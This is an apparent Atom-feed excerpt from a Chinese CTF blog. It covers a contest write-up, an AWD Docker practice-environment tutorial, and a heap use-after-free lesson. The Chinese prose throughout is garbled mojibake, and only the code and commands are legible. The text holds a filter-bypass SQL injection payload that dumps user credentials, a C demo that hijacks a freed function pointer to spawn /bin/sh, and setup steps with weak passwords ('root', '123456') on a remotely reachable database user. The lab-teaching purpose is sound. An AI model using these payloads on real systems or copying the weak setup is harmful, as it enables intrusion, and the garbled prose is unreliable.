string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è·‘flagå³å¯ã€‚</p><p>emmmä»¥ä¸Šæ˜¯ç›²æ³¨çš„æ–¹æ³•ï¼Œé‚£ä¹ˆä¸‹é¢è¿˜æœ‰é€šè¿‡fuzzå¾—åˆ°è¿‡æ»¤å…³é”®å­—ï¼Œç„¶åç»•è¿‡ç›´æ¥æ³¨çš„ï¼Œå› ä¸ºè¿™æ˜¯æœ‰å›æ˜¾çš„ä¸€ä¸ªæ³¨å…¥å˜›ã€‚</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>æ€»ä¹‹æ–¹æ³•æ€»æ˜¯å¤šç§å¤šæ ·çš„ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><blockquote><p>è‡³äºäºŒè¿›åˆ¶ï¼Œè¿˜åœ¨å­¦ä¹ ä¹‹ä¸­ï¼Œå¯†ç å­¦çš„RSA,å’ŒAESä¹Ÿéœ€è¦æŠ½ä¸ªæ—¶é—´æ¥æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“&quot;&gt;&lt;a href=&quot;#ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›-èµ›åå°ç»“&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“&quot;&gt;&lt;/a&gt;ç¬¬å››å±Šä¸Šæµ·ç½‘å®‰æš¨å…¨å›½é‚€è¯·èµ›_èµ›åå°ç»“&lt;
      
    
    </summary>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
      <category term="ç½‘ç»œå®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD_docker</title>
    <link href="http://www.yof3ng.xyz/2018/11/03/AWD-docker/"/>
    <id>http://www.yof3ng.xyz/2018/11/03/AWD-docker/</id>
    <published>2018-11-03T15:16:26.000Z</published>
    <updated>2018-11-03T17:02:54.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker"><a href="#æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker" class="headerlink" title="æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker"></a>æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker</h1><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…docker</h2><blockquote><p>ä¹‹å‰å·²ç»è®²è¿‡dockeræ€ä¹ˆå®‰è£…ï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œ<code>sudo apt-get install docker.io</code>ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚</p></blockquote><h2 id="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"><a href="#æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image" class="headerlink" title="æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image"></a>æ‹‰å–å…·æœ‰webç¯å¢ƒçš„image</h2><blockquote><p>é€šè¿‡<code>sudo docker search lamp</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾åˆ°æœ‰lampé›†æˆç¯å¢ƒçš„ä»–äººä¸Šä¼ çš„imageï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>äºæ˜¯æˆ‘é€‰æ‹©äº† tutum/lampè¿™ä¸ªimageã€‚</p><p>ä½¿ç”¨å‘½ä»¤ï¼š<code>sudo docker pull tutum/lamp</code>ï¼Œå°†imageæ‹‰å–åˆ°æœ¬åœ°åï¼Œä½¿ç”¨å‘½ä»¤<code>sudo docker images</code>æŸ¥çœ‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"><a href="#å°†CTF-xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹" class="headerlink" title="å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹"></a>å°†CTF_xinetdæ¡†æ¶çš„dockerfileè¿›è¡Œä¿®æ”¹</h2><blockquote><p>ä¿®æ”¹å¦‚ä¸‹:</p><ul><li><p>å°†åŸæ¥çš„<code>FORM ubuntu:16.04</code>æ”¹ä¸º<code>FROM tutum/lamp</code>å³ä¹‹å‰æ‹‰å–ä¸‹æ¥çš„å…·æœ‰webç¯å¢ƒçš„imageã€‚</p></li><li><p>æ·»åŠ <code>RUN apt-get -y install openssh-server</code>ä¸ºsshè¿æ¥åšå‡†å¤‡ã€‚</p></li><li>æ·»åŠ awdå‚èµ›è€…ç”¨æˆ·<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>æ·»åŠ htmlç›®å½•ä¸‹çš„webé¢˜æºç :<code>COPY ./html/ /var/www/html/web/</code></li><li>é…ç½®sshè¿œç¨‹è¿æ¥ï¼š<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>é™„ä¸Šsshd_configé…ç½®ï¼š</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>æ­¤æ—¶ctf_xinetdæ–‡ä»¶å¤¹ä¸‹çš„æƒ…å†µå¤§è‡´å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>binæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½® pwné¢˜çš„binaryç¨‹åºå’Œflagï¼Œhtmlæ–‡ä»¶å¤¹ç”¨äºæ”¾ç½®web_phpç¯å¢ƒçš„æºç ã€‚</p></blockquote><h2 id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>é…ç½®å¥½äº†Dockerfileï¼Œä»¥åŠbinæ–‡ä»¶å¤¹å’Œhtmlæ–‡ä»¶å¤¹åï¼Œéœ€è¦æ³¨æ„ctf_xinetdé…ç½®æ–‡ä»¶ä¸­çš„binaryç¨‹åºåéœ€è¦ä¸binæ–‡ä»¶å¤¹ä¸­çš„binaryç¨‹åºåä¿æŒä¸€è‡´ï¼Œè¿™ä¸ªå‚ç…§ctf_xinetdè¯´æ˜ä¹¦å³å¯ã€‚</p></blockquote><p>åˆ‡æ¢ç›®å½•åˆ°ä¸dockerfileåŒä¸€ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤:<code>docker build -t imagename .</code></p><p>å®ä¾‹ï¼š<code>docker build -t &quot;awd1test&quot; .</code></p><p>ç­‰å¾…dockerfileæ‰§è¡Œå®Œæ¯•ä¹‹åå°±å¾—åˆ°äº†ä¸€ä¸ªå®šåˆ¶çš„image:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>å¾—åˆ°å®šåˆ¶çš„imageåï¼Œå°±æ˜¯ç”Ÿæˆcontaineräº†ï¼š</p><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; awd1test</code></p><ul><li>18080:80è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„18080ç«¯å£</li><li>13306:3306è¡¨ç¤ºæŠŠdockerç¯å¢ƒçš„mysqlæœåŠ¡æ˜ å°„åˆ°ä¸»æœº13306ç«¯å£</li><li>10022:22è¡¨ç¤ºæ˜ å°„sshæœåŠ¡</li><li>19999:9999è¡¨ç¤ºæ˜ å°„pwné¢˜æœåŠ¡</li></ul></blockquote><p>æ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œé€šè¿‡<code>sudo docker ps</code>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„dockerçŠ¶æ€ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103231044.png" alt=""></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><blockquote><p>æ‰§è¡Œå‘½ä»¤<code>sudo docker exec -ti 15d94d229fcb /bin/bash</code>è¿›å…¥å®¹å™¨ã€‚</p></blockquote><p>è¿›å…¥å®¹å™¨ä¹‹åé¦–å…ˆï¼š</p><ul><li>é€šè¿‡<code>passwd</code>å‘½ä»¤è®¾ç½®rootç”¨æˆ·çš„å¯†ç ä»¥åŠawduserç”¨æˆ·çš„å¯†ç ï¼Œå¹¶ä¸”å¼€å¯sshè¿œç¨‹è¿æ¥æœåŠ¡ï¼Œä»¥ä¾¿è¿ç»´å’Œawdå‚èµ›è€…çš„è¿æ¥ã€‚</li><li>è®¾ç½®å®Œå¯†ç åå¼€å¯sshæœåŠ¡==&gt;<code>service ssh start</code>ã€‚</li><li>åˆå§‹çŠ¶æ€ï¼Œmysqlçš„rootè´¦æˆ·æ˜¯æ²¡æœ‰å¯†ç çš„ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨ä¸ºrootæ·»åŠ å¯†ç <code>mysql&gt; set password for root@localhost = password(&#39;root&#39;);</code>ï¼Œåˆ†å‘ç»™å‚èµ›è€…çš„è´¦æˆ·ä¸ºadminï¼Œå¯†ç éšæœºç”Ÿæˆã€‚</li><li>è‹¥æœ‰mysqlæ•°æ®åº“éœ€è¦åŠ è½½ï¼Œåˆ™ä½¿ç”¨ç±»ä¼¼<code></code>source /var/www/html/web/tcho.sql;`å‘½ä»¤æ¥åŠ è½½sqlè„šæœ¬æ–‡ä»¶ã€‚</li><li>æ·»åŠ å‚èµ›è€…æ•°æ®åº“ç”¨æˆ·ï¼š<code>mysql&gt; insert into mysql.user(Host,User,Password) values(&quot;%&quot;,&quot;awduser&quot;,password(&quot;123456&quot;));</code></li></ul><p>å…³äºå…·ä½“çš„webé¢˜ç¯å¢ƒå’Œpwné¢˜ç¯å¢ƒï¼Œè¯·è‡ªè¡Œæ›´æ”¹ç›¸å…³æ–‡ä»¶ã€‚</p><h2 id="æ¼”ç¤º"><a href="#æ¼”ç¤º" class="headerlink" title="æ¼”ç¤º"></a>æ¼”ç¤º</h2><p>è¿è¡Œèµ·æ¥çš„webæœåŠ¡ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233718.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181104005557.png" alt=""></p><p>è¿è¡Œåœ¨åŒä¸€dockerå®¹å™¨å†…çš„pwn:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103233932.png" alt=""></p><blockquote><p>è™½ç„¶éå¸¸ç®€é™‹ï¼Œä½†æ˜¯ç”¨äºç»ƒä¹ è¿˜æ˜¯è¶³å¤Ÿçš„ã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker&quot;&gt;&lt;a href=&quot;#æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD-docker&quot; class=&quot;headerlink&quot; title=&quot;æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD docker&quot;&gt;&lt;/a&gt;æ‰“é€ ä¸€ä¸ªé›†web
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="ç¯å¢ƒéƒ¨ç½²" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
      <category term="docker" scheme="http://www.yof3ng.xyz/tags/docker/"/>
    
      <category term="AWD" scheme="http://www.yof3ng.xyz/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-11æœˆ02-Hitcon-å…­</title>
    <link href="http://www.yof3ng.xyz/2018/11/02/Pwn-11%E6%9C%8802-Hitcon-%E5%85%AD/"/>
    <id>http://www.yof3ng.xyz/2018/11/02/Pwn-11æœˆ02-Hitcon-å…­/</id>
    <published>2018-11-02T06:31:11.000Z</published>
    <updated>2018-11-03T12:08:19.410Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-11æœˆ02-Hitcon-å…­"><a href="#Pwn-11æœˆ02-Hitcon-å…­" class="headerlink" title="Pwn-11æœˆ02-Hitcon-å…­"></a>Pwn-11æœˆ02-Hitcon-å…­</h1><blockquote><p>è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼</p></blockquote><h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10-hacknote"></a>lab10-hacknote</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿuafåˆæ˜¯ä»€ä¹ˆï¼Ÿåˆæ˜¯ä¸€é“æ¶¨å§¿åŠ¿çš„é¢˜å‘¢ã€‚å•Šå•Šå•Šä»è¿™å„¿å¼€å§‹å°±æ¥è§¦å †è¿™ç©æ„å„¿äº†ï¼ï¼ï¼</p><p><a href="https://www.sohu.com/a/239388523_354899" target="_blank" rel="noopener">å †æº¢å‡ºå­¦ä¹ ä¹‹è·¯</a></p></blockquote><h3 id="UAF-use-after-free"><a href="#UAF-use-after-free" class="headerlink" title="UAF (use after free)"></a>UAF (use after free)</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; Use after freeï¼Œè·Ÿå­—é¢ä¸Šçš„æ„æ€ä¸€æ ·ï¼šç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜ç©ºé—´åœ¨é‡Šæ”¾è¿‡åæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œå¯¼è‡´ä¸‹æ¬¡ç”³è¯·å†…å­˜çš„æ—¶å€™å†æ¬¡ä½¿ç”¨è¯¥å†…å­˜å—ï¼Œä½¿å¾—ä»¥å‰çš„å†…å­˜æŒ‡é’ˆå¯ä»¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚</p><p>&nbsp; &nbsp; &nbsp; &nbsp; é‚£é€šè¿‡UAFæ¼æ´ï¼Œæˆ‘ä»¬èƒ½å¹²å˜›ï¼Œå½“ç„¶æ˜¯ç›´æ¥getshellï¼Œé€šè¿‡ä¸‹é¢ä¸€æ®µcç¨‹åºï¼Œè¿›è¡Œç¼–è¯‘å°±èƒ½getshelläº†ï¼ˆç¨‹åºä»£ç æ¥è‡ª<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">4ct10nçš„åšå®¢</a> ï¼‰ï¼š</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">evil_fuc</span><span class="token punctuation">(</span><span class="token keyword">char</span> command<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">system</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token keyword">char</span> content<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    func_ptr <span class="token operator">*</span>p1<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>echo<span class="token punctuation">;</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"hello again\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span>    func_ptr <span class="token operator">*</span>p2<span class="token operator">=</span><span class="token punctuation">(</span>func_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc addr: %p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span>    p2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>evil_fuc<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.</span>    p1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç¼–è¯‘è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/11/02/5bdbf64c0bcc4.png" alt=""></p></blockquote><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><blockquote><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">fast binå‚è€ƒPDF</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194003.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102194047.png" alt=""></p><p>fastbin attack é€šå¸¸ä¸å †å—è”ç³»åœ¨ä¸€èµ·ï¼Œæ˜¯CTFä¸­å¸¸è§é¢˜å‹ã€‚</p><p>å®šä¹‰å¦‚ä¸‹ï¼š</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Fastbin 